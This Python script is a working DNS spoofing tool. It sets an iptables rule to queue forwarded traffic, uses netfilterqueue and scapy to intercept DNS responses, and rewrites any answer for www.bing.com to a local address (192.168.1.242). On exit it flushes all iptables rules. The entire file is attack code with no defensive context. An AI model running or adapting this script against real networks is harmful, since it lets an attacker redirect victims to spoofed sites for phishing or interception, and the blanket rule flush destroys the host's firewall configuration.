import netfilterqueue
import scapy.all as scapy
import subprocess
import optparse


# get arguments q
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue_position", dest="queue_position",
                      help="queue position of iptable, for exemple '0'")
    (options, arguments) = parser.parse_args()
    return int(options.queue_position)


# subprocess.call('sudo apt-get install iptables', shell=True)

# use de funtion get_arguments to get queueu position
queue_position = get_arguments()

# create a command to save information in iptable
s_iptable = f'iptables -I FORWARD -j NFQUEUE --queue-num {str(queue_position)}'

# call function
subprocess.call(s_iptable, shell=True)
print(s_iptable)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.242")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


# use function NetFilterQueue to execute a function in information recive
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_position, process_packet)
    queue.run()

# if cancell process execute the flush in iptables
except KeyboardInterrupt:
    subprocess.call('iptables --flush', shell=True)
    print("[-] Stop Program IPTABLES deleted")
